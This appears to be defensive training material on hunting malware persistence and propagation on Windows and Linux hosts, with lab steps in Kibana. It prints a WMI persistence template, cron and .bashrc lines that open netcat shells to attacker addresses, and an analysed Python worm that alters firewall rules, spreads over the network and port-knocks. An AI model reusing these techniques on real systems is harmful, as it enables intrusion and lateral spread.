The Python script cannot execute by itself. Recall from the process list that the Python script is a child process to svchost.exe. Typically, a process is a child of svchost.exe when run as a scheduled task. Open an Administrator PowerShell prompt, and issue the following command to find all running scheduled tasks:
Get-ScheduledTask | findstr "Running"



7. Rather than investigate each task individually, use the scripting capabilities within PowerShell to craft the following command:
Get-ScheduledTask | ForEach-Object { #1
    if ($_.state -eq "Running"){ #2
        $task = [System.String]::Concat($_.taskpath,$_.taskname) #3
        schtasks.exe /TN $task /FO list /v #4
    }
}



The command above performs the following (where #1, #2, #3, and #4 correspond to the lines in the command):


#1: Loops over each scheduled task.
#2: Checks to see if the current object ($_)  has a state of Running, meaning the scheduled task is currently running on the machine.
#3: Concatenates the task path, with the task name for the current running task. For instance, if the task is in the root directory, then its path is \, and if its name is MyTask, then the value of $task is \MyTask.
#4: Launches the schtasks.exe command and looks up the current task with its full path. The output is formatted into a list, with all arguments visible. This provides enough detail to find the malicious scheduled task.


The MSUpdater task is extremely suspicious and contains the task seen earlier in the ProcessMonitor process list.


The same task output also indicates what the schedule type is for this task. 


Use this workflow to answer the following question.
<img width="1266" height="662" alt="image" src="https://github.com/user-attachments/assets/85fc4607-909c-47c7-b150-71a055fbbf41" />


----------------


Host-Based Malware Persistence Techniques
Common Windows Persistence Techniques
﻿

Registry Entries
﻿

The Windows Registry provides a wealth of information about the host system and also provides a great vector for attackers to hide malicious activities. In particular, the following registry locations can be used to ensure that malware is executed each time the Operating System (OS) boots:

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
﻿

Similar registry keys exist to launch specific software upon user login:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
﻿

Below is a non-exhaustive list of additional registry keys that malware often targets:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\UserInit

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager\BootExecute
HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\Shell
﻿

Windows Management Instrumentation Event Subscriptions
﻿

The Windows Management Instrumentation Command-Line (WMIC) service is a powerful utility that allows system administrators to gain deep insight into the Windows OS. The process of configuring a WMI object for persistence requires creating an event filter, creating an event consumer, and binding the two together: 


$FilterArgs = @{name='Windows-Updater';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
$ConsumerArgs = @{name='Windows-Updater';
                CommandLineTemplate="C:\Windows\System32\msUp64.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
﻿


Using the template above, an attacker can upload a malicious executable (msUp64.exe) and create a WMI event scheduler such that the provided executable image is executed within 5 minutes of the machine bootup. 

﻿

Common Linux Persistence Techniques
﻿

Crontab Entry
﻿

The Linux cron system is designed to execute scheduled jobs at specific intervals. Although the majority of these jobs are benign system administrator tasks, attackers can take advantage of cron to provide persistence for their malware.

﻿

An attacker might create the following cron job entry to execute a bind shell every day at 4 a.m.:

0 4 * * * nc -e /bin/bash <Attacker IP> <Attacker Port>

﻿

This cron executes the Netcat application every day at 4 a.m. and connects to the attacker’s listener using /bin/bash to send the shell. An attacker can modify the name of the application, which may not resemble Netcat or another known tool. The following command does the same thing as above, but the application name has been changed:

0 4 * * * /etc/sysinfo -e /bin/bash <Attacker IP> <Attacker Port>

﻿

By recognizing the command syntax for Netcat, the analyst can determine that /etc/sysinfo is, in fact, Netcat. Generally speaking, if an Internet Protocol (IP) address is present in a crontab entry, it should cause concern and be investigated.

﻿

Event-Based Execution
﻿

Linux OSs come with several files designed to set up the user environment upon login. Typically, the first profile loaded is the user’s Bourne Again Shell (Bash) .bashrc file, located in the user’s home directory. This file contains routines that are executed as soon as the user logs into their account. An attacker can leverage this by placing malicious code within the ~/.bashrc file. For example, consider the following snippet from a .bashrc file:

alias lsa='ls -la'
alias ll='ls -lart'
alias l='ls -l'
﻿

The above snippet sets up aliases for the ls command. However, if an attacker gained access to the user’s account and replaced those aliases with the following, they would be granted a remote shell any time the commands were run:

alias lsa='ls -la && /usr/bin/nc 123.123.123.123 1337'
alias ll='ls -lart && /usr/bin/nc 123.123.123.123 1337'
alias l='ls -l && /usr/bin/nc 123.123.123.123 1337'
﻿

Another location where an attacker could place an event-based execution mechanism is the system’s /etc/profile. This file is owned by root, so an attacker would need root access to be able to modify this file. If an attacker gained root access and made malicious modifications to this file, then any time any user logged into the machine, the malicious code would be executed.


---------------

Analyze Malware Persistence on Linux
As part of the investigation into the malware from the previous lab, evidence is discovered that a Linux host also serves as part of the Command and Control (C2) associated with the previously discovered malware. Complete the steps in the following workflow to analyze an event-based persistence mechanism.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal window, and run the following command to investigate the .bashrc file:

cat ~/.bashrc
﻿

The following line in the .bashrc file is not a standard line and indicates a persistent malware infection:

exec -a "/usr/bin/vmtoolsd" /usr/bin/python3 /usr/vmusr&
﻿

The above line executes the Python interpreter but uses an option to make it appear in the process list as something that might look normal. It is located among many other lines of code, making it difficult to locate with casual browsing of the file contents.

﻿

Another way to identify potentially malicious software executing at startup is to issue the jobs command. This shows any jobs the user has backgrounded. In this case, the malware is being run in the background, so jobs uncovers it.

﻿

3. Execute the following command:

ps -ef | grep vmusr
﻿

Two processes have the name of vmtoolsd. One is the child of Process Identifier (PID) 1 and is a legitimate process, and the other is the masqueraded process that was run out of the .bashrc file.

﻿

Use this workflow to answer the following questions.

Host-Based Malware Propagation Techniques
For malicious software to infect a network, it must be able to propagate, or move, from host to host. The most common types of malware are viruses, Trojan horses, and worms. Each type has a different method of propagating.

﻿

Virus 
﻿

A virus is a program that propagates via removable media, email, or embedded code called macros. The virus executes when a user interacts with the infected application or email.

﻿

Trojan Horse
﻿

Trojan horse applications are malicious programs that propagate by masquerading as useful applications but that also contain code designed to steal information. A Trojan horse requires user interaction to execute but, once executed, can be controlled remotely.

﻿

Worm 
﻿

A worm is a type of malicious software that can self-replicate. Worms take advantage of system vulnerabilities to propagate and can copy themselves to other hosts across the network. They connect to a C2 server to build a network of infected machines known as a botnet to carry out large-scale Distributed Denial of Service (DDoS) attacks.

----------------

Analyze Malware Propagation
The previous two workflows have investigated some execution and persistence indicators of a piece of malware. Complete the steps in the final workflow to discover how this malware propagates across the network.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

As a reminder from a previous lab, the malicious scheduled task (MSUpdater) runs with the following arguments:

C:\users\trainee\AppData\Local\Programs\Python\Python310\python.exe C:\Users\Trainee\AppData\Local\listen.py
﻿

2. Navigate to the location listed, and open the listen.py script in Notepad to begin analyzing the script. This script provides substantial information, starting at the top:

HOST = "199.63.64.31"
PORT = b'MTMzNw=='
SERV = b'MTIzLjEyMy4xMjMuMTIz'
ID = b'MHhBQkFEQkVFRg=='
PRE_VALIDATE=[
b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iVVBEQVRFUi1JTiI=',
b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iQURWQU5DRUQgQ09NTVVOSUNBVElPTlMi']
net_hosts = []
﻿

The above snippet shows that the malware is obfuscated in some way. Additionally, an IP address is associated with the VM itself. Nothing in this section appears to be associated with the malware propagation.

﻿

3. Moving down the script, a block appears to be executing code on the VM. A connect function is being called, which could be an indication of malicious propagation. Note this, and continue the script analysis.

for opt in PRE_VALIDATE:
    os.popen(base64.b64decode(opt).decode())
  
    try:       
 os.popen(base64.b64decode(b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iQURWQU5DRUQgQ09NTVVOSUNBVElPTlMiIGRpcj1vdXQgYWN0aW9uPWFsbG93IHByb3RvY29sPVRDUCBsb2NhbHBvcnQ9NDg5NDQ=').decode())
    except:
        pass  
    try:
    ns.connect((base64.b64decode(SERV).decode(),int(base64.b64decode(b'NDg5NDQ=').decode())))
        ns.sendall(base64.b64.decode(ID))
        ns.close()
    except:
        pass
   
    validate = b'bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iVVBEQVRFUi1JTiIgZGlyPWluIGFjdGlvbj1hbGxvdyBwcm90b2NvbD1UQ1AgbG9jYWxwb3J0PTEzMzc='
    update = os.popen(base64.b64decode(validate).decode())
﻿

The next section of code looks quite promising. It starts off by checking the Address Resolution Protocol (ARP) cache and then initiates an Internet Control Message Protocol (ICMP) ping request to any hosts in the cache. The most interesting part of this block is near the end. A connect function is called that creates a network connection to any hosts that respond to the ICMP request. Then the send function is called, and the socket object is passed as an argument. 

    with os.popen('arp -a') as net:
        data = net.read()
        import re
        for line in re.findall('([-.0-9]+)\s+([-0-9a-f]{17})\s+(\w+)',data):
            net_hosts.append(line[0])
    for addr in net_hosts:
        with os.popen(f"ping -n 1  {addr}") as x:
            resp = x.read()
            for line in re.findall("Reply from", resp):
                try:
                    ns.connect((addr,int(base64.b64decode(b'MTMzNw==').decode())))
                    send(ns)
 
                except socket.error as e:
                    pass
﻿

The next code segment appears to set up a standard Python listening server socket:

    try:
        s.bind((HOST,int(base64.b64decode(b'MTMzNw==').decode())))
   
    except socket.error as msg:
        print(f"Bind Failed. Error Code: {msg}")
        s.close()
        sys.exit()
   
    s.listen()
    conn, addr = s.accept()
﻿

The final section contains the send function, and a file handle is opened. The file is then read line by line, and each line is sent through a network socket. This is likely the location of the propagation mechanism that the malware employs.

def send(s):
    fh = open(base64.b64decode(b'QzpcVXNlcnNcdHJhaW5lZVxBcHBEYXRhXExvY2FsXGxpc3Rlbi5weQ==').decode(),'r')
    for line in fh.readlines():
        try:
            s.sendall(base64.b64encode(line.encode()))
        except:
            s.close()
    s.close()
﻿

The references to the Base64 library indicate that portions of the script have been encoded using base64.b64encode and decoded using base64.b64decode. Recall the following variable from the beginning of the script:

ID = b'MHhBQkFEQkVFRg=='﻿

﻿

Many different methods may be used to decode this information, but the Python Integrated Development Environment (IDE) seems the simplest in this situation.

﻿

4. From the taskbar, select the Python Integrated Development and Learning Environment (IDLE) icon. Import the Base64 library, and call the b64decode function, passing the encoded string as an argument: 

<img width="646" height="74" alt="image" src="https://github.com/user-attachments/assets/d5661c91-3bc0-4626-b273-748d97fe2357" />

5. Select Enter, and discover that the ID variable stores the value 0xABADBEEF.


6. Use this process for the remaining Base64-encoded information in the script.


Use this workflow to answer the questions that foll ow.

### CDAH-M22L2-Monitoring Hosts for Malware Network Activity ###




Identifying Network-Based Malware Using Host Logs

A previous lesson focused on monitoring host logs to identify malicious activity local to an individual host. These logs can also be used to correlate events between hosts to identify malware communicating and propagating throughout the network. Doing so inherently requires logs from multiple hosts to compare against one another. Although it is possible to investigate each host’s logs individually, it is significantly more efficient to have hosts forward their logs to a centralized monitoring solution that helps correlate events. A Host Analyst needs to know what they are looking at when they receive such events and the basics of navigating the tools. Several centralized monitoring solutions exist; this lesson focuses on using Elastic Stack and Winlogbeat.

﻿

View Logs in Elastic Stack
﻿

Workflow
﻿

1. Open the Virtual Machine (VM) win-hunt. The login credentials are as follows:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome, and select the Security Onion bookmark.

﻿

3. Log in to the Security Onion dashboard using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

4. On the Getting Started page, select the hamburger menu icon, and select Kibana under Tools on the left menu.

﻿

5. Log in to Elastic with the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

6. Access the Discover dashboard by selecting the hamburger menu icon in the top left corner of the home screen and selecting the Discover menu option.

﻿

The Kibana event dashboard collects information from multiple sources, such as Security Onion modules, Logstash, and Winlogbeat. Kibana refers to each of these as an index pattern. The pattern for Security Onion is *:so-*. 

﻿

7. Change the index pattern to *:winlogbeat-*, and display the Windows Event Log data stored on the server.

﻿

Kibana allows for the ability to focus on a particular time range. 

﻿

8. In order to view the necessary events, set the date for Kibana to the absolute date range from September 16th, 2022 at 0900 to September 16th, 2022 at 1300, then select Update

<img width="607" height="84" alt="image" src="https://github.com/user-attachments/assets/2ff5a9a5-a7a5-4767-9303-cebc61e31c69" />

The options on the left side of the User Interface (UI) allow for filtering of the Kibana log output for such elements as specific host names, port numbers, and event log identifiers (ID). 


9. Select the host.name filter to see which host is responsible for the logging:

<img width="551" height="203" alt="image" src="https://github.com/user-attachments/assets/a875c2c5-07dc-4518-a34e-28babe6f2e74" />


The host win-hunt is responsible for the logs.


10. Open a command prompt window, and examine the listening ports with the following command:
netstat -anotp tcp | findstr LISTEN



11. Inspect the list for unusual listening ports. Make a note of the far right column, which provides the Process ID (PID) associated with the listening port. For any suspicious ports, execute the following command to view the process associated with that ID:
tasklist | findstr <PROCESSID>



Keep all VMs and tools open, as they are used in the next workflow. Answer the following questions.

--------------------------

Monitoring for Malicious Network Behavior
Inherently, network-based malware, which is malicious software that spreads and infects systems through network connections, must communicate with the network. This occurs in several ways, and each method has a different purpose and different behavior to look for.
﻿

﻿

Command and Control
﻿

Malware is useful to an attacker only if it can be communicated with. The breadth of communication techniques between an attacker and malware is referred to as Command and Control (C2). This can take many forms, but all the forms have a few things in common.

﻿

C2 communications are generally relatively consistent compared to other malicious network traffic. C2 traffic almost always must reach out to the internet at some point. When this external traffic occurs and where it goes always have a pattern. The timing and destination may not be completely consistent, as good Operational Security (OPSEC) typically has several C2 servers for malware to alternate between and has some variance in how often the malware connects. However, by correlating events across a network, it is possible to identify such behavior as connections to the same set of Internet Protocol (IP) addresses on a roughly 4-hour basis.

﻿

The behavior after the initial communication is also often easy to profile. If malware beacons approximately every 4 hours, monitoring would likely show these heartbeat-style connections followed by subsequent connections that relay instructions from the C2 server to the malware and connections from the malware to the C2 server containing exfiltrated data. Periods of extended connection may also occur as an attacker decides to interact directly with the malware, via a remote access tool, for example.

﻿

A few popular protocols used by C2 frameworks are as follows:


Hypertext Transfer Protocol/Hypertext Transfer Protocol Secure (HTTP/HTTPS)

File Transfer Protocol (FTP)

Domain Name System (DNS)

Internet Relay Chat (IRC)

Server Message Block (SMB)


C2 communication occurs over a variety of protocols that is too wide to list. It is more important to profile the behavior of the communications themselves and identify anomalies, such as protocols, that are otherwise unused in the network or machines reaching out to the internet when they have no reason to do so.

﻿

Port Scanning and Network Enumeration
﻿

Network-based malware is often used as a foothold to explore the rest of the network before moving laterally. Monitoring often reveals malware performing port scans and network enumeration to identify other hosts and potentially vulnerable services on the network. This most often takes the form of hundreds or thousands of connections to a variety of IPs and ports over a short period of time. Savvy attackers may severely limit the number of connections made over time or constrict the ports being scanned to commonly used services to avoid being obvious, but the actual data contained in the traffic is often easy to detect. For example, Nmap, by default, attempts to avoid logging by never completing the Transmission Control Protocol (TCP) handshake. Many hosts do not log incomplete connections by default, but it is possible to configure hosts to do so or to generate an alert when they have a high number of incomplete connections. Many applications already have rules built in to generate alerts or events based on popular scanning tools and techniques.

﻿

These activities can be found in any logs that note network connections. The default Windows Event Logs can be configured to log network connections. However, such tools as Sysmon and Zeek are significantly more robust and can be configured to log a variety of different behaviors rather than every network connection and to include information not included in the default Windows Event Logs.


----------

Analyze Malicious Network Execution

With the new evidence and location of the malicious script, it is important to look for details related to any C2 or other malicious activities that may be executing. Complete the steps in the following workflow to analyze the script for malicious network execution.

﻿

NOTE: The VM win-hunt, Security Onion, and Elastic Stack should be open from the prior workflow. If they are not, use the following credentials to open them:

﻿

win-hunt﻿

Username: trainee

﻿

Security Onion and Elastic﻿

Username: trainee@jdmss.lan

﻿

Workflow
﻿

1. Set the date range for Kibana from September 16, 2022 @ 09:00 to September 16, 2022 @ 13:00.

﻿

2. Show event logs related to scheduled jobs by using the following search filter:

(event.code:"4701" or event.code:"4702" or event.code:"4703")

﻿

3. Finally, filter out all of the scheduled tasks related to Microsoft Windows by appending the following to the search filter:

 and (NOT "\Microsoft\*")
﻿

The full Kibana query should now read:

(event.code:"4701" or event.code:"4702" or event.code:"4703") and (NOT "\Microsoft\*")
﻿

Keep all VMs and tools open, as they are used in the next workflow. Answer the following question.

<img width="1095" height="561" alt="image" src="https://github.com/user-attachments/assets/929fc9cd-8fd1-4d08-bd02-7691918eeedc" />


---------------

Persistence for Network-Based Malware
As mentioned earlier, malware is not of much use to an attacker if they cannot communicate with it. In the same way that malware must find a way to persist on the host, it must also have some mechanism to be persistently reachable over the network. The section about C2 touched on such concepts as beaconing, but other ways exist for malware to persist on the network. These include methods of staying hidden, as malware cannot persist if it is caught. To accomplish persistence, network malware relies on two broad attack vectors: external services and traffic signaling.

﻿

External Services
﻿

An attacker must have some way to communicate with the malware inside a network. This is accomplished by abusing an external service, and it can go in either direction. For example, beacons out to the internet frequently go over HTTPS because most traffic leaving the network is HTTPS traffic from users browsing the public internet. This helps the beacons blend in. However, traffic also often flows into the network via other protocols. 

﻿

HTTPS traffic may come in if the network hosts a public web server, but that traffic should rarely make it further in than the Demilitarized Zone (DMZ). On the other hand, with more people working remotely, more companies have had to leverage remote access technologies and protocols, such as Virtual Private Networks (VPN) and Secure Shell (SSH). 

﻿

Attackers can communicate with their malware over these protocols and take advantage of being allowed through the firewall. Usually, this involves the attacker’s providing the expected packet headers for their chosen protocol while disguising their commands and communications within other parts of the packet. 

﻿

Manipulated TCP flags and abnormally large packets are common signs of disguised C2 communication. An attacker’s creativity really is the limit for how to go about this. VPNs and SSH are common targets, but other examples seen in the wild include Windows Remote Management (WinRM), Virtual Network Computing (VNC), and Docker and Kubernetes (K8s) Application Programming Interfaces (API). Anything that touches outside the network or subnet is a potential access vector.

﻿

External services do not have to be limited to services that touch the internet, however. Just as protections are in place to separate a network from the internet, internal boundaries separate different departments or separate servers from users. Malware must also find ways to circumvent these barriers using services external to their subnet. A common example is Cobalt Strike agents. Some agents may call out to the internet over HTTPS to communicate with the C2 server, but not every computer in a network can touch the internet. Even if a computer can do so, an attacker probably does not want every agent beaconing out to the same external host with a very noticeable pattern. In this case, the recommendation is to establish a chain of agents that forward traffic for each other. HTTPS might not be allowed to leave some subnets, but it is quite common to allow SMB through a firewall to reach such services as file servers. Agents can be configured to use an SMB listener to communicate with one another, so the agents that cannot reach the internet send their traffic over SMB to agents that can, which, in turn, send that traffic out via HTTPS. This is still a case of abusing an external service, as the malware is leveraging an otherwise-legitimate channel that must be externally exposed.

﻿

Traffic Signaling
﻿

The lesson has mentioned that such anomalies as strange packet flags and options or abnormally large packets may be signs of malware running over otherwise-legitimate services. (Rely on your baseline to determine the expected packet sizes in the network being analyzed.) This is a form of traffic signaling. Traffic signaling is any technique that manipulates traffic in a specific way to communicate with malware. The packet might include a magic number that the malware is programmed to respond to in some way, such as beaconing out or spawning a listener that the attacker can connect to. ﻿

﻿

Another traffic signaling technique is port knocking, in which the attacker sends a series of specific packets in a particular order that mimics a secret door knock. These packets might contain a series of magic numbers, or they might just be sent to a series of specific high-port numbers. There are a few ways this could be implemented. One such way is to send a single SYN packet to a list of random high ports, one at a time, in a specific order. Once that order has been observed by the malware, a fourth random high port is opened and listens for an inbound connection. Any deviation from the specific ports would cause the listening port to remain closed. 

﻿

﻿Port stealing is also related to traffic signaling. For example, a target system may allow only SSH traffic through the firewall. An attacker manages to install malware on the system and has it listen on some random high port, such as 31337. Obviously, the firewall does not allow traffic to port 31337, so the attacker installs a firewall rule that redirects any SSH traffic from a specific source port, such as 54321, to localhost:31337. As long as the attacker communicates specifically from port 54321, the traffic reaches the malware. 

﻿

Traffic signaling may also be accomplished by the malware’s listening for the traffic at a lower layer of the Open Systems Interconnection (OSI) model than the firewall. For example, an attacker with root privileges may install a rootkit that uses a raw socket to listen for traffic on Layer 2, Data Link. Since iptables, a common firewall solution for UNIX systems, works at Layers 3 and higher, the rootkit sees the traffic before the firewall drops the packets. Although the rootkit cannot continue to communicate in this manner, it may be signaled to beacon out to the attacker.

﻿

Both of these methods can be difficult to catch via host logs because many logging solutions do not capture the level of detail needed to identify the behavior. Some services may log that some odd behavior, such as a malformed session, occurred. Normally, these activities must be detected through behavioral analysis at both the network and host levels. A Host-Based Intrusion Detection System (HIDS), such as SolarWinds or Tripwire®, could alert on this type of behavior. More frequently, however, this behavior is alerted on by a network-level Intrusion Detection System (IDS), and then individual host logs can be used to correlate events between hosts.

--------------------

Analyze Malware Network Persistence
Through the use of Winlogbeat installed on the Windows host, Kibana can aggregate Windows Event Logs to aid in discovering malware. Complete the steps in the following workflow to aggregate such logs.

﻿

NOTE: The VM win-hunt, Security Onion, and Elastic Stack should be open from the prior workflow. If they are not, use the following credentials to open them:

﻿

win-hunt﻿

Username: trainee
Password: CyberTraining1!
﻿

Security Onion and Elastic﻿

Password: CyberTraining1!
﻿

Workflow
﻿

1.  Set the date range for Kibana from September 16, 2022 @ 09:00 to September 16, 2022 @ 13:00.

﻿

2. Show event logs related to the Microsoft firewall by using the following search filter:

event.code:"2004" or event.code:"2006"

﻿

Event code 2004 is related to the creation of a new firewall rule, and event 2006 is related to the deletion of a firewall rule.

﻿

The message field contains information related to the firewall rule. Included in the information are the rule name, rule direction, and protocol. The port number is included not here but, instead, in the winlog.event_data.LocalPorts field.

﻿

Keep all VMs and tools open, and answer the following questions.
<img width="1077" height="535" alt="image" src="https://github.com/user-attachments/assets/fa47ba9d-786e-4b22-8c8e-21b8df8b7f75" />

Knowledge Check
The following is a snippet from the malicious script that displays a function:

﻿

d﻿ef pop(a,i):
 ﻿   ran = [65535//i, 32768+i, 1337*i]
 ﻿   stat = []
 ﻿   for r in ran:
 ﻿       ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ﻿       ps.setdefaulttimeout(1)

 ﻿       s = ps.connect_ex((a,r))
 ﻿       if s == 0:
 ﻿           stat.append("OK")
 ﻿       ps.close()
 ﻿   if(len(stat) == 3):
 ﻿       ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ﻿       connect((a,int(base64.b64decode(b'NDg5NDQ=').decode())))
 ﻿       ps.sendall(base64.b64decode(b'MHhGRUVEQkVFRg=='))
 ﻿       ps.close()

 ﻿   if(ps):
 ﻿       ps.close()

<img width="1004" height="659" alt="image" src="https://github.com/user-attachments/assets/ced04d5b-2392-4388-bc7d-bd2fedc522ca" />


--------------

Knowledge Check Solution
The purpose of the provided code snippet is to issue a port knock trigger and, upon sending three successful port knocks, some Base64-encoded data is transferred to the remote host. The obfuscated nature of the function makes determining its functionality slightly difficult; however, the function can be broken down into four main components, as follows.

﻿

Port Knock Part 1
     ran = [65535//i, 32768+i, 1337*i]
﻿

The above code creates an array of three numbers, which act as ports.

﻿

The i  variable is passed as an argument to the pop() function to modify which ports are contacted.

﻿

Port Knock Part 2
   for r in ran:
       ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       ps.setdefaulttimeout(1)
       s = ps.connect_ex((a,r))
﻿

The above code iterates over the ports in the ran array and connects to the host passed to the pop() function, which is stored in the a variable.

﻿

Port Knock Part 3
        if s == 0:
              stat.append("OK")
        ps.close()
﻿

A zero indicates that the connect_ex function returned without error, meaning that a successful connection was made. The status of OK is added to the stat array to indicate that the port was successfully knocked.

﻿

Port Knock Part 4
     if(len(stat) == 3):
          ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          connect((a,int(base64.b64decode(b'NDg5NDQ=').decode())))
          ps.sendall(base64.b64decode(b'MHhGRUVEQkVFRg=='))
          ps.close()
﻿

If each port has been successfully knocked, the length of the stat array is three (one entry for each port), and a new connection will be established to the host passing Base64-encoded data.﻿

-----------

Propagation of Network-Based Malware
Thus far, the lesson has focused on identifying malware already present in the network. However, it is arguably more important to identify when and how the malware ended up there or, ideally, identify its presence as it is happening and potentially prevent it. This section focuses on techniques malware commonly uses to move laterally and propagate throughout a network.

﻿

Phishing
﻿

The main source of malware is phishing, a method of malware propagation that takes advantage of individuals’ willingness to trust the validity of an email or email attachment. For example, a threat actor creates a phishing email campaign targeting users who tend to purchase blue tennis shoes. The email is created to entice the targeted users to open a malicious link promising a surprising discount on the newest blue tennis shoe. Instead of taking the user to a storefront, the email link sends a request to the threat actor’s C2 platform and executes a browser exploitation framework against the user’s web browser, potentially resulting in a compromised machine.

﻿

Code Obfuscation
﻿

Although signatures can be written for common malware heuristics, threat actors can obfuscate their code by modifying the code’s structure. Examples include the use of command shortcuts, such as the PowerShell function ExecutionPolicy (shortcut -ep), or modifying the code via exclusive or (XOR) or Base64 encoding. Malicious code that is obfuscated through these methods easily bypasses simple signature-based firewalls and can even pass through heuristic-based scanners.

If an attacker’s C2 IP address is compromised, the entire campaign risks being shut down. One technique the attacker can use to provide redundancy is setting up a fast flux DNS network for DNS request modification. In this technique, the attacker provides multiple IP-to-domain-name mappings for their C2 platform. As soon as one IP is compromised, the C2 is switched to another. There are three types of fast flux networks: Dynamic DNS (DDNS), single flux, and double flux networks.

Windows Management Instrumentation (WMI) and Server Message Block (SMB)

WMI and SMB protocols can also be leveraged to propagate malware through a network. With WMI, attackers can gain remote command execution capabilities on Windows systems, enabling them to take control of network resources. Malware can utilize SMB to exploit vulnerabilities in the file-sharing protocol in order to gain further access across a network. These tactics are more difficult to protect against, as they are commonly used by system administrators to manage users and computers within a domain.
